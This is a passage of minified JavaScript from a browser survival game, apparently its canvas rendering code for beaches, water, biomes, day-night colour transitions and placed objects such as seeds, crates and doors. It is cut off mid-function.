        s_.time = s_.time ? 0 : 1;
        D.globalAlpha = 1;
      } else {
        e.draw(i, t);
      }
    }
    function Wo(e, i, t, r, n, a, o, s, _, E) {
      if (s_.transition) {
        D.globalAlpha = 1;
        e(i, t, r, n, a, o, s, _, E);
        s_.time = s_.time ? 0 : 1;
        D.globalAlpha = 1 - s_.shade.v;
        e(i, t, r, n, a, o, s, _, E);
        s_.time = s_.time ? 0 : 1;
        D.globalAlpha = 1;
      } else {
        e(i, t, r, n, a, o, s, _, E);
      }
    }
    function Vo(e, i, t, r, n, a, o) {
      var s;
      var _ = "#";
      _ += (s = Math.floor(r * o + (1 - o) * e)) < 16 ? "0" + s.toString(16) : s.toString(16);
      _ += (s = Math.floor(n * o + (1 - o) * i)) < 16 ? "0" + s.toString(16) : s.toString(16);
      return _ += (s = Math.floor(a * o + (1 - o) * t)) < 16 ? "0" + s.toString(16) : s.toString(16);
    }
    function wo(e, i, t, r, n, a) {
      var o = r.w1;
      var s = r.w2;
      var _ = r.w3;
      var E = __.cam.x + e - 700;
      var T = Math.max(__.cam.y + i, 0);
      var A = Math.max(-__.cam.y + p - t - 100, 0);
      var d = T;
      var h = p - T - A;
      if (a) {
        var I = r.t(o).x;
      } else {
        I = o.r.x;
      }
      var u = E + ds.LW1SX;
      ds.W1SX;
      u += I + ds.W1SX - 2;
      if (a) {
        I = r.t(s).x;
      } else {
        I = s.r.x;
      }
      var l = E + ds.LW2SX - u + I;
      var O = (u += l - 2) - 2;
      if (a) {
        I = r.t(_).x;
      } else {
        I = _.r.x;
      }
      if (O < u + (l = E + ds.LW3SX - u + I) - 3) {
        u += l - 2;
      } else {
        u = O;
      }
      l = E + ds.LSANDX - u;
      if (a > 0 && n.isSand === 1) {
        if (s_.transition) {
          var c = s_.time ? 1 - s_.shade.v : s_.shade.v;
          D.fillStyle = Vo(15, 77, 72, 252, 239, 187, c);
        } else {
          D.fillStyle = Ie.SAND_COLOR[s_.time];
        }
        D.fillRect(u, d, l, h);
      } else {
        if (s_.transition) {
          c = s_.time ? 1 - s_.shade.v : s_.shade.v;
          D.fillStyle = Vo(n.night[0], n.night[1], n.night[2], n.day[0], n.day[1], n.day[2], c);
        } else {
          D.fillStyle = n._color[s_.time];
        }
        D.fillRect(u, d, l, h);
      }
    }
    function Ko(e, i, t, r, n, a) {
      var o = r.w1;
      var s = r.w2;
      var _ = r.w3;
      var E = __.cam.x + e - 700;
      var T = Math.max(__.cam.y + i, 0);
      var A = Math.max(-__.cam.y + p - t - 100, 0);
      var d = T;
      var h = p - T - A;
      if (a) {
        var I = r.t(o);
      } else {
        I = o.r;
      }
      var u = E + ds.LW1SX;
      var l = u;
      var O = d;
      var c = I.x + ds.W1SX;
      var R = h;
      var g = u += I.x + ds.W1SX - 2;
      if (a) {
        I = r.t(s);
      } else {
        I = s.r;
      }
      var C = E + ds.LW2SX - u + I.x;
      var N = u;
      var b = d;
      var S = C;
      var m = h;
      var v = (u += C - 2) - 2;
      if (a) {
        I = r.t(_);
      } else {
        I = _.r;
      }
      if (v < u + (C = E + ds.LW3SX - u + I.x) - 3) {
        var M = true;
        var L = u;
        var G = d;
        var f = C;
        var H = h;
        var P = u += C - 2;
      } else {
        M = false;
        u = v;
        P = -1;
      }
      C = E + ds.LSANDX - u;
      if (s_.transition) {
        var y = s_.time ? 1 - s_.shade.v : s_.shade.v;
        D.fillStyle = Vo(9, 55, 63, 11, 106, 132, y);
      } else {
        D.fillStyle = Ie.WATER_3_COLOR[s_.time];
      }
      D.fillRect(l, O, c, R);
      if (a) {
        if (s_.transition) {
          y = s_.time ? 1 - s_.shade.v : s_.shade.v;
          D.fillStyle = Vo(15, 70, 76, 42, 139, 155, y);
        } else {
          D.fillStyle = Ie.WATER_2_COLOR[s_.time];
        }
      } else if (s_.transition) {
        y = s_.time ? 1 - s_.shade.v : s_.shade.v;
        D.fillStyle = Vo(9, 55, 63, 11, 106, 132, y);
      } else {
        D.fillStyle = Ie.WATER_3_COLOR[s_.time];
      }
      D.fillRect(N, b, S, m);
      if (M) {
        if (a) {
          if (s_.transition) {
            y = s_.time ? 1 - s_.shade.v : s_.shade.v;
            D.fillStyle = Vo(17, 94, 96, 169, 214, 211, y);
          } else {
            D.fillStyle = Ie.WATER_1_COLOR[s_.time];
          }
        } else if (s_.transition) {
          y = s_.time ? 1 - s_.shade.v : s_.shade.v;
          D.fillStyle = Vo(9, 55, 63, 11, 106, 132, y);
        } else {
          D.fillStyle = Ie.WATER_3_COLOR[s_.time];
        }
        D.fillRect(L, G, f, H);
      }
      if (n_.quality && a) {
        r.draw_foams_left(v, P, g, E, -__.cam.y + O, -__.cam.y + O + R);
      }
    }
    function Uo(e, i, t, r, n, a) {
      var o = r.w1;
      var s = r.w2;
      var _ = r.w3;
      var E = __.cam.y + e - 700;
      var T = Math.max(__.cam.x + i, 0);
      var A = Math.max(-__.cam.x + S - t - 100, 0);
      var d = T;
      var h = S - T - A;
      if (a) {
        var I = r.t(o).x;
      } else {
        I = o.r.x;
      }
      var u = E + ds.LW1SX;
      ds.W1SX;
      u += I + ds.W1SX - 2;
      if (a) {
        I = r.t(s).x;
      } else {
        I = s.r.x;
      }
      var l = E + ds.LW2SX - u + I;
      var O = (u += l - 2) - 2;
      if (a) {
        I = r.t(_).x;
      } else {
        I = _.r.x;
      }
      if (O < u + (l = E + ds.LW3SX - u + I) - 3) {
        u += l - 2;
      } else {
        u = O;
      }
      l = E + ds.LSANDX - u;
      if (a > 0 && n.isSand === 1) {
        if (s_.transition) {
          var c = s_.time ? 1 - s_.shade.v : s_.shade.v;
          D.fillStyle = Vo(15, 77, 72, 252, 239, 187, c);
        } else {
          D.fillStyle = Ie.SAND_COLOR[s_.time];
        }
        D.fillRect(d, u, h, l);
      } else {
        if (s_.transition) {
          c = s_.time ? 1 - s_.shade.v : s_.shade.v;
          D.fillStyle = Vo(n.night[0], n.night[1], n.night[2], n.day[0], n.day[1], n.day[2], c);
        } else {
          D.fillStyle = n._color[s_.time];
        }
        D.fillRect(d, u, h, l);
      }
    }
    function Yo(e, i, t, r, n, a) {
      var o = r.w1;
      var s = r.w2;
      var _ = r.w3;
      var E = __.cam.y + e - 700;
      var T = Math.max(__.cam.x + i, 0);
      var A = Math.max(-__.cam.x + S - t - 100, 0);
      var d = T;
      var h = S - T - A;
      if (a) {
        var I = r.t(o);
      } else {
        I = o.r;
      }
      var u = E + ds.LW1SX;
      var l = d;
      var O = u;
      var c = I.x + ds.W1SX;
      var R = h;
      var g = u += I.x + ds.W1SX - 2;
      if (a) {
        I = r.t(s);
      } else {
        I = s.r;
      }
      var C = E + ds.LW2SX - u + I.x;
      var N = u;
      var b = d;
      var p = C;
      var m = h;
      var v = (u += C - 2) - 2;
      if (a) {
        I = r.t(_);
      } else {
        I = _.r;
      }
      if (v < u + (C = E + ds.LW3SX - u + I.x) - 3) {
        var M = true;
        var L = u;
        var G = d;
        var f = C;
        var H = h;
        var P = u += C - 2;
      } else {
        M = false;
        u = v;
        P = -1;
      }
      C = E + ds.LSANDX - u;
      if (s_.transition) {
        var y = s_.time ? 1 - s_.shade.v : s_.shade.v;
        D.fillStyle = Vo(9, 55, 63, 11, 106, 132, y);
      } else {
        D.fillStyle = Ie.WATER_3_COLOR[s_.time];
      }
      D.fillRect(l, O, R, c);
      if (a) {
        if (s_.transition) {
          y = s_.time ? 1 - s_.shade.v : s_.shade.v;
          D.fillStyle = Vo(15, 70, 76, 42, 139, 155, y);
        } else {
          D.fillStyle = Ie.WATER_2_COLOR[s_.time];
        }
      } else if (s_.transition) {
        y = s_.time ? 1 - s_.shade.v : s_.shade.v;
        D.fillStyle = Vo(9, 55, 63, 11, 106, 132, y);
      } else {
        D.fillStyle = Ie.WATER_3_COLOR[s_.time];
      }
      D.fillRect(b, N, m, p);
      if (M) {
        if (a) {
          if (s_.transition) {
            y = s_.time ? 1 - s_.shade.v : s_.shade.v;
            D.fillStyle = Vo(17, 94, 96, 169, 214, 211, y);
          } else {
            D.fillStyle = Ie.WATER_1_COLOR[s_.time];
          }
        } else if (s_.transition) {
          y = s_.time ? 1 - s_.shade.v : s_.shade.v;
          D.fillStyle = Vo(9, 55, 63, 11, 106, 132, y);
        } else {
          D.fillStyle = Ie.WATER_3_COLOR[s_.time];
        }
        D.fillRect(G, L, H, f);
      }
      if (n_.quality && a) {
        r.draw_foams_top(v, P, g, E, -__.cam.x + l, -__.cam.x + l + R);
      }
    }
    function ko(e, i, t, r, n, a) {
      var o = r.w1;
      var s = r.w2;
      var _ = r.w3;
      var E = __.cam.x + e + 820;
      var T = Math.max(__.cam.y + i, 0);
      var A = Math.max(-__.cam.y + p - t - 100, 0);
      var d = T;
      var h = p - T - A;
      if (a) {
        var I = r.t(o).x;
      } else {
        I = o.r.x;
      }
      var u = E + ds.LW1SX;
      ds.W1SX;
      u += -I + ds.W1SX + 2;
      if (a) {
        I = r.t(s).x;
      } else {
        I = s.r.x;
      }
      var l = E - ds.LW2SX - u - I;
      var O = (u += l + 2) - 2;
      if (a) {
        I = r.t(_).x;
      } else {
        I = _.r.x;
      }
      if (O > u + (l = E - ds.LW3SX - u - I)) {
        u += l + 2;
      } else {
        u = O;
      }
      l = E - ds.LSANDX - u;
      if (a > 0 && n.isSand === 1) {
        if (s_.transition) {
          var c = s_.time ? 1 - s_.shade.v : s_.shade.v;
          D.fillStyle = Vo(15, 77, 72, 252, 239, 187, c);
        } else {
          D.fillStyle = Ie.SAND_COLOR[s_.time];
        }
        D.fillRect(u, d, l, h);
      } else {
        if (s_.transition) {
          c = s_.time ? 1 - s_.shade.v : s_.shade.v;
          D.fillStyle = Vo(n.night[0], n.night[1], n.night[2], n.day[0], n.day[1], n.day[2], c);
        } else {
          D.fillStyle = n._color[s_.time];
        }
        D.fillRect(u, d, l, h);
      }
    }
    function Fo(e, i, t, r, n, a) {
      var o = r.w1;
      var s = r.w2;
      var _ = r.w3;
      var E = __.cam.x + e + 820;
      var T = Math.max(__.cam.y + i, 0);
      var A = Math.max(-__.cam.y + p - t - 100, 0);
      var d = T;
      var h = p - T - A;
      if (a) {
        var I = r.t(o);
      } else {
        I = o.r;
      }
      var u = E + ds.LW1SX;
      var l = u;
      var O = d;
      var c = -I.x + ds.W1SX;
      var R = h;
      var g = u += -I.x + ds.W1SX + 2;
      if (a) {
        I = r.t(s);
      } else {
        I = s.r;
      }
      var C = E - ds.LW2SX - u - I.x;
      var N = u;
      var b = d;
      var S = C;
      var m = h;
      var v = (u += C + 2) - 2;
      if (a) {
        I = r.t(_);
      } else {
        I = _.r;
      }
      if (v > u + (C = E - ds.LW3SX - u - I.x)) {
        var M = true;
        var L = u;
        var G = d;
        var f = C;
        var H = h;
        var P = u += C + 2;
      } else {
        M = false;
        u = v;
        P = -1;
      }
      C = E - ds.LSANDX - u;
      if (s_.transition) {
        var y = s_.time ? 1 - s_.shade.v : s_.shade.v;
        D.fillStyle = Vo(9, 55, 63, 11, 106, 132, y);
      } else {
        D.fillStyle = Ie.WATER_3_COLOR[s_.time];
      }
      D.fillRect(l, O, c, R);
      if (a) {
        if (s_.transition) {
          y = s_.time ? 1 - s_.shade.v : s_.shade.v;
          D.fillStyle = Vo(15, 70, 76, 42, 139, 155, y);
        } else {
          D.fillStyle = Ie.WATER_2_COLOR[s_.time];
        }
      } else if (s_.transition) {
        y = s_.time ? 1 - s_.shade.v : s_.shade.v;
        D.fillStyle = Vo(9, 55, 63, 11, 106, 132, y);
      } else {
        D.fillStyle = Ie.WATER_3_COLOR[s_.time];
      }
      D.fillRect(N, b, S, m);
      if (M) {
        if (a) {
          if (s_.transition) {
            y = s_.time ? 1 - s_.shade.v : s_.shade.v;
            D.fillStyle = Vo(17, 94, 96, 169, 214, 211, y);
          } else {
            D.fillStyle = Ie.WATER_1_COLOR[s_.time];
          }
        } else if (s_.transition) {
          y = s_.time ? 1 - s_.shade.v : s_.shade.v;
          D.fillStyle = Vo(9, 55, 63, 11, 106, 132, y);
        } else {
          D.fillStyle = Ie.WATER_3_COLOR[s_.time];
        }
        D.fillRect(L, G, f, H);
      }
      if (n_.quality && a) {
        r.draw_foams_right(v, P, g, E, -__.cam.y + O, -__.cam.y + O + R);
      }
    }
    function xo(e, i, t, r, n, a) {
      var o = r.w1;
      var s = r.w2;
      var _ = r.w3;
      var E = __.cam.y + e + 710;
      var T = Math.max(__.cam.x + i, 0);
      var A = Math.max(-__.cam.x + S - t - 100, 0);
      var d = T;
      var h = S - T - A;
      if (a) {
        var I = r.t(o).x;
      } else {
        I = o.r.x;
      }
      var u = E + ds.LW1SX;
      ds.W1SX;
      u += -I + ds.W1SX + 2;
      if (a) {
        I = r.t(s).x;
      } else {
        I = s.r.x;
      }
      var l = E - ds.LW2SX - u - I;
      var O = (u += l + 2) - 2;
      if (a) {
        I = r.t(_).x;
      } else {
        I = _.r.x;
      }
      if (O > u + (l = E - ds.LW3SX - u - I)) {
        u += l + 2;
      } else {
        u = O;
      }
      l = E - ds.LSANDX - u;
      if (a > 0 && n.isSand === 1) {
        if (s_.transition) {
          var c = s_.time ? 1 - s_.shade.v : s_.shade.v;
          D.fillStyle = Vo(15, 77, 72, 252, 239, 187, c);
        } else {
          D.fillStyle = Ie.SAND_COLOR[s_.time];
        }
        D.fillRect(d, u, h, l);
      } else {
        if (s_.transition) {
          c = s_.time ? 1 - s_.shade.v : s_.shade.v;
          D.fillStyle = Vo(n.night[0], n.night[1], n.night[2], n.day[0], n.day[1], n.day[2], c);
        } else {
          D.fillStyle = n._color[s_.time];
        }
        D.fillRect(d, u, h, l);
      }
    }
    function Jo(e, i, t, r, n, a) {
      var o = r.w1;
      var s = r.w2;
      var _ = r.w3;
      var E = __.cam.y + e + 710;
      var T = Math.max(__.cam.x + i, 0);
      var A = Math.max(-__.cam.x + S - t - 100, 0);
      var d = T;
      var h = S - T - A;
      if (a) {
        var I = r.t(o);
      } else {
        I = o.r;
      }
      var u = E + ds.LW1SX;
      var l = u;
      var O = d;
      var c = -I.x + ds.W1SX;
      var R = h;
      var g = u += -I.x + ds.W1SX + 2;
      if (a) {
        I = r.t(s);
      } else {
        I = s.r;
      }
      var C = E - ds.LW2SX - u - I.x;
      var N = u;
      var b = d;
      var p = C;
      var m = h;
      var v = (u += C + 2) - 2;
      if (a) {
        I = r.t(_);
      } else {
        I = _.r;
      }
      if (v > u + (C = E - ds.LW3SX - u - I.x)) {
        var M = true;
        var L = u;
        var G = d;
        var f = C;
        var H = h;
        var P = u += C + 2;
      } else {
        M = false;
        u = v;
        P = -1;
      }
      C = E - ds.LSANDX - u;
      if (s_.transition) {
        var y = s_.time ? 1 - s_.shade.v : s_.shade.v;
        D.fillStyle = Vo(9, 55, 63, 11, 106, 132, y);
      } else {
        D.fillStyle = Ie.WATER_3_COLOR[s_.time];
      }
      D.fillRect(O, l, R, c);
      if (a) {
        if (s_.transition) {
          y = s_.time ? 1 - s_.shade.v : s_.shade.v;
          D.fillStyle = Vo(15, 70, 76, 42, 139, 155, y);
        } else {
          D.fillStyle = Ie.WATER_2_COLOR[s_.time];
        }
      } else if (s_.transition) {
        y = s_.time ? 1 - s_.shade.v : s_.shade.v;
        D.fillStyle = Vo(9, 55, 63, 11, 106, 132, y);
      } else {
        D.fillStyle = Ie.WATER_3_COLOR[s_.time];
      }
      D.fillRect(b, N, m, p);
      if (M) {
        if (a) {
          if (s_.transition) {
            y = s_.time ? 1 - s_.shade.v : s_.shade.v;
            D.fillStyle = Vo(17, 94, 96, 169, 214, 211, y);
          } else {
            D.fillStyle = Ie.WATER_1_COLOR[s_.time];
          }
        } else if (s_.transition) {
          y = s_.time ? 1 - s_.shade.v : s_.shade.v;
          D.fillStyle = Vo(9, 55, 63, 11, 106, 132, y);
        } else {
          D.fillStyle = Ie.WATER_3_COLOR[s_.time];
        }
        D.fillRect(G, L, H, f);
      }
      if (n_.quality && a) {
        r.draw_foams_bottom(v, P, g, E, -__.cam.x + O, -__.cam.x + O + R);
      }
    }
    function Xo() {
      D.globalAlpha = 1;
      if (s_.transition) {
        var e = s_.shade.update();
      }
      s_.update_dist_from_biomes(-__.cam.x, -__.cam.y);
      So = Math.max(Math.floor(-__.cam.x / s_.dw) - 5, 0);
      po = Math.min(Math.floor((-__.cam.x + __.cam.w) / s_.dw) + 4, s_.nw - 1);
      mo = Math.max(Math.floor(-__.cam.y / s_.dh) - 3, 0);
      vo = Math.min(Math.floor((-__.cam.y + __.cam.h) / s_.dh) + 3, s_.nh - 1);
      (function () {
        for (var e = s_.biomes.length - 1; e >= 0; e--) {
          if ((I = s_.biomes[e]).t === s_.BIOME_SEA) {
            var i = s_.BIOME[I.t];
            if (-__.cam.x >= I.x1 - 230 - S && -__.cam.x <= I.x2 + 330 && -__.cam.y >= I.y1 - p && -__.cam.y <= I.y2 + 100) {
              var t = I.x2;
              if (I.t !== s_.BIOME_SEA) {
                t -= 610;
              }
              var r = I.x1;
              if (I.t !== s_.BIOME_SEA) {
                r += 610;
              }
              var n = I.y2;
              if (I.t !== s_.BIOME_SEA) {
                n -= 610;
              }
              var a = I.y1;
              if (I.t !== s_.BIOME_SEA) {
                a += 610;
              }
              if (s_.transition) {
                var o = s_.time ? 1 - s_.shade.v : s_.shade.v;
                D.fillStyle = Vo(i.night[0], i.night[1], i.night[2], i.day[0], i.day[1], i.day[1], o);
              } else {
                D.fillStyle = i._color[s_.time];
              }
              var s = Math.max(__.cam.x + r - 2 - 230, 0);
              var _ = Math.max(-__.cam.x + S - t - 330 - 2, 0);
              var E = Math.max(__.cam.y + a - 2, 0);
              var T = Math.max(-__.cam.y + p - n - 100 - 2, 0);
              D.beginPath();
              D.fillRect(s, E, S - _ - s, p - E - T);
            }
          }
        }
        for (e = s_.biomes.length - 1; e >= 0; e--) {
          if ((I = s_.biomes[e]).t !== s_.BIOME_SEA) {
            t = I.x2;
            if (I.t !== s_.BIOME_SEA) {
              t -= 400;
            }
            r = I.x1;
            if (I.t !== s_.BIOME_SEA) {
              r += 400;
            }
            n = I.y2;
            if (I.t !== s_.BIOME_SEA) {
              n -= 300;
            }
            a = I.y1;
            if (I.t !== s_.BIOME_SEA) {
              a += 300;
            }
            if ((I.v & ds.RIGHT) == 0 && -__.cam.x >= t - S + 120 && -__.cam.x <= t + 820 && -__.cam.y >= a + 88 - p && -__.cam.y <= n + 50) {
              ko(t, a + 88, n - 88, __.beach[0], s_.BIOME[I.t], I.v & ds.RIGHT);
              Fo(t, a + 88, n - 88, __.beach[0], s_.BIOME[I.t], I.v & ds.RIGHT);
            }
            if ((I.v & ds.LEFT) == 0 && -__.cam.x >= r - S - 700 && -__.cam.x <= r - 20 && -__.cam.y >= a + 88 - p && -__.cam.y <= n + 50) {
              wo(r, a + 88, n - 88, __.beach[1], s_.BIOME[I.t], I.v & ds.LEFT);
              Ko(r, a + 88, n - 88, __.beach[1], s_.BIOME[I.t], I.v & ds.LEFT);
            }
            if ((I.v & ds.BOTTOM) == 0 && -__.cam.x >= r - 235 - S && -__.cam.x <= t + 350 && -__.cam.y >= n - p - 275 && -__.cam.y <= n + 490) {
              xo(n - 230, r - 230, t + 230, __.beach[2], s_.BIOME[I.t], I.v & ds.BOTTOM);
              Jo(n - 230, r - 230, t + 230, __.beach[2], s_.BIOME[I.t], I.v & ds.BOTTOM);
            }
            if ((I.v & ds.TOP) == 0 && -__.cam.x >= r - 235 - S && -__.cam.x <= t + 350 && -__.cam.y >= a - p - 390 && -__.cam.y <= a + 315) {
              Uo(a + 310, r - 230, t + 230, __.beach[3], s_.BIOME[I.t], I.v & ds.TOP);
              Yo(a + 310, r - 230, t + 230, __.beach[3], s_.BIOME[I.t], I.v & ds.TOP);
            }
          }
        }
        for (e = s_.biomes.length - 1; e >= 0; e--) {
          if ((I = s_.biomes[e]).t !== s_.BIOME_SEA) {
            t = I.x2;
            if (I.t !== s_.BIOME_SEA) {
              t -= 400;
            }
            r = I.x1;
            if (I.t !== s_.BIOME_SEA) {
              r += 400;
            }
            n = I.y2;
            if (I.t !== s_.BIOME_SEA) {
              n -= 300;
            }
            a = I.y1;
            if (I.t !== s_.BIOME_SEA) {
              a += 300;
            }
            if ((I.v & ds.RIGHT) != 0 && -__.cam.x >= t - S + 120 && -__.cam.x <= t + 820 && -__.cam.y >= a + 88 - p && -__.cam.y <= n + 50) {
              ko(t, a + 88, n - 88, __.beach[0], s_.BIOME[I.t], I.v & ds.RIGHT);
            }
            if ((I.v & ds.LEFT) != 0 && -__.cam.x >= r - S - 700 && -__.cam.x <= r - 20 && -__.cam.y >= a + 88 - p && -__.cam.y <= n + 50) {
              wo(r, a + 88, n - 88, __.beach[1], s_.BIOME[I.t], I.v & ds.LEFT);
            }
            if ((I.v & ds.BOTTOM) != 0 && -__.cam.x >= r - 235 - S && -__.cam.x <= t + 350 && -__.cam.y >= n - p - 275 && -__.cam.y <= n + 490) {
              xo(n - 230, r - 230, t + 230, __.beach[2], s_.BIOME[I.t], I.v & ds.BOTTOM);
            }
            if ((I.v & ds.TOP) != 0 && -__.cam.x >= r - 235 - S && -__.cam.x <= t + 350 && -__.cam.y >= a - p - 390 && -__.cam.y <= a + 315) {
              Uo(a + 310, r - 230, t + 230, __.beach[3], s_.BIOME[I.t], I.v & ds.TOP);
            }
          }
        }
        for (e = s_.biomes.length - 1; e >= 0; e--) {
          if ((I = s_.biomes[e]).t !== s_.BIOME_SEA) {
            i = s_.BIOME[I.t];
            if (-__.cam.x >= I.x1 - 230 - S && -__.cam.x <= I.x2 + 330 && -__.cam.y >= I.y1 - p && -__.cam.y <= I.y2 + 100) {
              t = I.x2;
              if (I.t !== s_.BIOME_SEA) {
                if ((I.v & ds.RIGHT) == 0) {
                  t -= 414;
                } else {
                  t -= 610;
                }
              }
              r = I.x1;
              if (I.t !== s_.BIOME_SEA) {
                if ((I.v & ds.LEFT) == 0) {
                  r += 414;
                } else {
                  r += 610;
                }
              }
              n = I.y2;
              if (I.t !== s_.BIOME_SEA) {
                if ((I.v & ds.BOTTOM) == 0) {
                  n -= 414;
                } else {
                  n -= 610;
                }
              }
              a = I.y1;
              if (I.t !== s_.BIOME_SEA) {
                if ((I.v & ds.TOP) == 0) {
                  a += 414;
                } else {
                  a += 610;
                }
              }
              if (s_.transition) {
                o = s_.time ? 1 - s_.shade.v : s_.shade.v;
                D.fillStyle = Vo(i.night[0], i.night[1], i.night[2], i.day[0], i.day[1], i.day[2], o);
              } else {
                D.fillStyle = i._color[s_.time];
              }
              s = Math.max(__.cam.x + r - 2 - 230, 0);
              _ = Math.max(-__.cam.x + S - t - 330 - 2, 0);
              E = Math.max(__.cam.y + a - 2, 0);
              T = Math.max(-__.cam.y + p - n - 100 - 2, 0);
              D.beginPath();
              D.fillRect(s, E, S - _ - s, p - E - T);
            }
          }
        }
        if (n_.quality) {
          Wo(Ro, mo, vo, So, po, Ie.WAVE_TWO, "isl", 2);
          Wo(Ro, mo, vo, So, po, Ie.WAVE_ONE, "isl", 2);
        }
        Wo(No, mo, vo, So, po, Ie.ISLAND, "isl", 2);
        if (n_.quality) {
          Wo(bo, mo, vo, So, po, Ie.DECORATION, "de");
        }
        var A = s_.units[us.PLAYERS];
        for (e = 0; e < A.length; e++) {
          for (var d = A[e], h = 0; h < d.foot.length; h++) {
            yo(d.foot[h]);
          }
        }
        if ((_a += I_ * 40) > 60) {
          _a -= 60;
        }
        Wo(Ea, mo, vo, So, po, Ie.RIVER, "r", 0);
        e = 0;
        for (; e < s_.biomes.length; e++) {
          var I;
          if ((I = s_.biomes[e]).t !== s_.BIOME_SEA) {
            t = I.x2;
            if (I.t !== s_.BIOME_SEA) {
              t -= 400;
            }
            r = I.x1;
            if (I.t !== s_.BIOME_SEA) {
              r += 400;
            }
            n = I.y2;
            if (I.t !== s_.BIOME_SEA) {
              n -= 300;
            }
            a = I.y1;
            if (I.t !== s_.BIOME_SEA) {
              a += 300;
            }
            if ((I.v & ds.RIGHT) > 0 && -__.cam.x >= t - S + 120 && -__.cam.x <= t + 820 && -__.cam.y >= a + 88 - p && -__.cam.y <= n + 50) {
              Fo(t, a + 88, n - 88, __.beach[0], s_.BIOME[I.t], I.v & ds.RIGHT);
            }
            if ((I.v & ds.LEFT) > 0 && -__.cam.x >= r - S - 700 && -__.cam.x <= r - 20 && -__.cam.y >= a + 88 - p && -__.cam.y <= n + 50) {
              Ko(r, a + 88, n - 88, __.beach[1], s_.BIOME[I.t], I.v & ds.LEFT);
            }
            if ((I.v & ds.BOTTOM) > 0 && -__.cam.x >= r - 235 - S && -__.cam.x <= t + 350 && -__.cam.y >= n - p - 275 && -__.cam.y <= n + 490) {
              Jo(n - 230, r - 230, t + 230, __.beach[2], s_.BIOME[I.t], I.v & ds.BOTTOM);
            }
            if ((I.v & ds.TOP) > 0 && -__.cam.x >= r - 235 - S && -__.cam.x <= t + 350 && -__.cam.y >= a - p - 390 && -__.cam.y <= a + 315) {
              Yo(a + 310, r - 230, t + 230, __.beach[3], s_.BIOME[I.t], I.v & ds.TOP);
            }
          }
        }
      })();
      (function () {
        var e = So;
        var i = po;
        var n = mo;
        var a = vo;
        if (n_.quality) {
          Wo(No, n, a, e, i, Ie.LAKE_EDGE, "l", 2);
        }
        if (n_.quality) {
          Wo(No, n, a, e, i, Ie.LAVA_GROUND, "la", 5);
        }
        Wo(No, n, a, e, i, Ie.MAGMA, "la", 5);
        Wo(Ro, n, a, e, i, Ie.LAKE, "l", 2);
        if (n_.quality) {
          Wo(Do, n, a, e, i, Ie.MAGMA, "la", 5);
          Wo(Ro, n, a, e, i, Ie.LAKE_DEEP, "l", 2);
        }
        Wo(No, n, a, e, i, Ie.MARKER, "ma", 3);
        for (var o = s_.units[us.SAND_WORM], s = 0; s < o.length; s++) {
          o[s].draw_ground();
        }
        var _ = s_.units[us.PLAYERS];
        for (s = 0; s < _.length; s++) {
          for (var E = _[s], T = 0; T < E.swim.length; T++) {
            Po(E.swim[T]);
          }
        }
        var A = s_.units[us.BRIDGE];
        for (s = 0; s < A.length; s++) {
          zo(A[s], Ie.BRIDGE);
          A[s].draw_life(A[s].info);
        }
        var d = s_.units[us.FURNACE];
        for (s = 0; s < d.length; s++) {
          if (d[s].action == 2) {
            Mo(d[s]);
          }
        }
        var h = s_.units[us.FIRE];
        for (s = 0; s < h.length; s++) {
          Mo(h[s], Ie.WOOD_FIRE);
        }
        var I = s_.units[us.RESURRECTION];
        for (s = 0; s < I.length; s++) {
          Mo(I[s]);
        }
        var u = s_.units[us.EMERALD_MACHINE];
        for (s = 0; s < u.length; s++) {
          Mo(u[s]);
        }
        var l = s_.units[us.BIG_FIRE];
        for (s = 0; s < l.length; s++) {
          Mo(l[s], Ie.BIG_FIRE_WOOD);
        }
        var O = s_.units[us.SIGN];
        for (s = 0; s < O.length; s++) {
          zo(O[s]);
        }
        var c = s_.units[us.PLOT];
        for (s = 0; s < c.length; s++) {
          zo(c[s], Ie.PLOT);
        }
        var R = s_.units[us.SEED];
        for (s = 0; s < R.length; s++) {
          Mo(R[s]);
        }
        R = s_.units[us.TOMATO_SEED];
        s = 0;
        for (; s < R.length; s++) {
          Mo(R[s]);
        }
        R = s_.units[us.SEED];
        s = 0;
        for (; s < R.length; s++) {
          Lo(R[s]);
        }
        var g = s_.units[us.CARROT_SEED];
        for (s = 0; s < g.length; s++) {
          if (!((g[s].info & 15) != 0 && g[s].info !== 10)) {
            zo(g[s]);
          }
        }
        var C = s_.units[us.WATERMELON_SEED];
        for (s = 0; s < C.length; s++) {
          if (!((C[s].info & 15) != 0 && C[s].info !== 10)) {
            zo(C[s]);
          }
        }
        var N = s_.units[us.ALOE_VERA_SEED];
        for (s = 0; s < N.length; s++) {
          if (!((N[s].info & 15) != 0 && N[s].info !== 10)) {
            zo(N[s]);
          }
        }
        var b = s_.units[us.WHEAT_MOB];
        for (s = 0; s < b.length; s++) {
          zo(b[s], Ie.WHEAT_SEED);
        }
        var S = s_.units[us.GARLIC_SEED];
        for (s = 0; s < S.length; s++) {
          if (!((S[s].info & 15) != 0 && S[s].info !== 10)) {
            zo(S[s]);
          }
        }
        var p = s_.units[us.THORNBUSH_SEED];
        for (s = 0; s < p.length; s++) {
          if (!((p[s].info & 15) != 0 && p[s].info !== 10)) {
            zo(p[s]);
          }
        }
        var m = s_.units[us.PUMPKIN_SEED];
        for (s = 0; s < m.length; s++) {
          if (!((m[s].info & 15) != 0 && m[s].info !== 10)) {
            zo(m[s]);
          }
        }
        b = s_.units[us.WHEAT_SEED];
        s = 0;
        for (; s < b.length; s++) {
          zo(b[s]);
        }
        var v = s_.units[us.CRATE];
        if (!r.visuals.renderAtTop.boxes) {
          for (s = 0; s < v.length; s++) {
            zo(v[s], Ie.CRATE, Ie.HURT_DEAD_BOX);
          }
          var M = s_.units[us.DEAD_BOX];
          for (s = 0; s < M.length; s++) {
            zo(M[s], Ie.CRATE, Ie.HURT_DEAD_BOX);
          }
        }
        var L = s_.units[us.GIFT];
        for (s = 0; s < L.length; s++) {
          zo(L[s], Ie.GIFT, Ie.HURT_GIFT);
        }
        var G = s_.units[us.WOOD_DOOR_SPIKE];
        for (s = 0; s < G.length; s++) {
          if (G[s].info & 1) {
            zo(G[s], Ie.DOOR_WOOD_OPEN);
          }
        }
        G = s_.units[us.STONE_DOOR_SPIKE];
        s = 0;
        for (; s < G.length; s++) {
          if (G[s].info & 1) {
            zo(G[s], Ie.DOOR_STONE_OPEN);
          }
        }
        G = s_.units[us.GOLD_DOOR_SPIKE];
        s = 0;
        for (; s < G.length; s++) {
          if (G[s].info) {
            zo(G[s], Ie.DOOR_GOLD_OPEN);
          }
        }
        G = s_.units[us.DIAMOND_DOOR_SPIKE];
        s = 0;
        for (; s < G.length; s++) {
          if (G[s].info) {
